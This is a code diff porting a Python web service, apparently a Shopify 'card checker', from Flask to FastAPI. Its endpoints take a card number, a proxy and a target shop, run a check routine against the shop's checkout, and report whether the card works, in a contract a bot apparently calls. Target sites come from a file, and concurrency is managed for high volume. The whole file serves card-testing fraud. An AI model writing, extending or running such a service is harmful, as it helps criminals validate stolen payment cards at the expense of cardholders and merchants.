-                        "Price": "0.00", "Proxy": "not used", "Response": "ERROR", "Status": "false"}), 200
+        payload = {"CC": cc, "Currency": "USD", "Gateway": "unknown", "Price": "0.00",
+                   "Proxy": "Dead", "Response": f"ERROR: {str(e)[:80]}", "Status": "false"}
+    finally:
+        _stats["active"] -= 1
+        _slots.release()
+
+    out = _v2_wrap(payload, site)
+    out["elapsed"] = round(time.monotonic() - t0, 2)
+    _count(out)
+    return JSONResponse(out)
 
 
-@app.route("/shopii/health", methods=["GET"])
-def health():
-    return jsonify({"status": "ok", "service": "shopify-gate"})
+@app.api_route("/shopii", methods=["GET", "POST"])
+@app.api_route("/shopii/persisted", methods=["GET", "POST"])
+@app.api_route("/shopiig", methods=["GET", "POST"])
+@app.api_route("/shopii/graphql", methods=["GET", "POST"])
+async def shopii(request: Request, cc: str | None = Query(None), proxy: str | None = Query(None),
+                 site: str | None = Query(None)):
+    """Legacy contract the bot speaks: no key, ?site= required."""
+    body = {}
+    if request.method == "POST":
+        try:
+            body = await request.json()
+        except Exception:
+            body = {}
+    cc = cc or body.get("cc") or body.get("card")
+    proxy = proxy or body.get("proxy")
+    site = site or body.get("site") or body.get("shop")
 
+    if not cc or not site:
+        return JSONResponse({
+            "CC": cc or "", "Currency": "USD", "Gateway": "unknown", "Price": "0.00",
+            "Proxy": "Dead", "Response": "MISSING_CARD" if not cc else "MISSING_SITE",
+            "Status": "false"}, status_code=400)
 
-@app.errorhandler(Exception)
-def _handle_all(e):
-    return jsonify({"CC": "", "Currency": "USD", "Gateway": "unknown",
-                    "Price": "0.00", "Proxy": "not used",
-                    "Response": "ERROR", "Status": "false"}), 200
+    if SITE_MODE == "file":
+        picked = _pick_site()
+        if picked:
+            site = picked
+
+    if not await _acquire():
+        return JSONResponse({"CC": cc, "Currency": "USD", "Gateway": "unknown", "Price": "0.00",
+                             "Proxy": "Dead", "Response": "SERVER_BUSY", "Status": "false"}, status_code=503)
+
+    _stats["active"] += 1
+    _stats["total"] += 1
+    try:
+        payload = await asyncio.wait_for(run_check(cc, site, proxy or ""), timeout=REQUEST_TIMEOUT)
+    except asyncio.TimeoutError:
+        payload = {"CC": cc, "Currency": "USD", "Gateway": "unknown", "Price": "0.00",
+                   "Proxy": "Dead", "Response": "TIMEOUT", "Status": "false"}
+    except Exception as e:
+        payload = {"CC": cc, "Currency": "USD", "Gateway": "unknown", "Price": "0.00",
+                   "Proxy": "Dead", "Response": f"ERROR: {str(e)[:80]}", "Status": "false"}
+    finally:
+        _stats["active"] -= 1
+        _slots.release()
+
+    _count(payload)
+    return JSONResponse(payload)
 
 
 if __name__ == "__main__":
-    host = HOST or "0.0.0.0"
-    mode = str(CFG.SERVER).lower()
-    limit = f"MAX_CONCURRENCY={CFG.MAX_CONCURRENCY}" + (
-        "" if int(CFG.MAX_CONCURRENCY) > 0
-        else f" (load guard at {CFG.LOAD_MAX_PERCENT}%)")
-    print(f"[kali_api] {len(API_KEYS)} key(s) | {SITES_FILE} ({len(_load_sites())} sites) | "
-          f"{limit} | timeout={CFG.REQUEST_TIMEOUT}s | site_mode={CFG.SITE_MODE}", flush=True)
-    try:
-        # waitress: one process, THREADS worker threads — the right shape for a
-        # network-bound checker (no GIL-bound CPU work to spread across cores).
-        if mode not in ("auto", "waitress"):
-            raise ImportError("waitress disabled by KALI_SERVER")
-        from waitress import serve
-        print(f"[kali_api] waitress {host}:{PORT} threads={THREADS}", flush=True)
-        serve(app, host=host, port=PORT, threads=THREADS,
-              connection_limit=1000, channel_timeout=300, ident="kali_api")
-    except ImportError:
-        import shutil
-        gunicorn = shutil.which("gunicorn") if mode in ("auto", "gunicorn") else None
-        if gunicorn:
-            # gthread gives us exactly THREADS workers in one process
-            os.chdir(os.path.dirname(os.path.abspath(__file__)))
-            print(f"[kali_api] gunicorn gthread workers={CFG.WORKERS} "
-                  f"threads={THREADS} {host}:{PORT}", flush=True)
-            os.execv(gunicorn, [gunicorn,
-                                "--worker-class", "gthread",
-                                "--workers", str(max(1, int(CFG.WORKERS))),
-                                "--threads", str(THREADS),
-                                "--bind", f"{host}:{PORT}",
-                                "--timeout", str(max(60, int(CFG.REQUEST_TIMEOUT) + 30)),
-                                "--access-logfile", "-",
-                                "main:app"])
-        print(f"[kali_api] flask dev server {host}:{PORT} "
-              f"(pip install waitress) slots={CFG.MAX_CONCURRENCY or THREADS}", flush=True)
-        app.run(host=host, port=PORT, debug=False, threaded=True, use_reloader=False)
+    print(f"[kali_api] async port | {len(API_KEYS)} key(s) | {SITES_FILE} "
+          f"({len(_load_sites())} sites) | slots={SLOTS} | load_guard={LOAD_MAX}% | "
+          f"timeout={REQUEST_TIMEOUT}s | site_mode={SITE_MODE}", flush=True)
+    uvicorn.run("main:app", host=HOST, port=PORT, workers=max(1, int(CFG.WORKERS)),
+                access_log=False, backlog=1024, timeout_keep_alive=60)
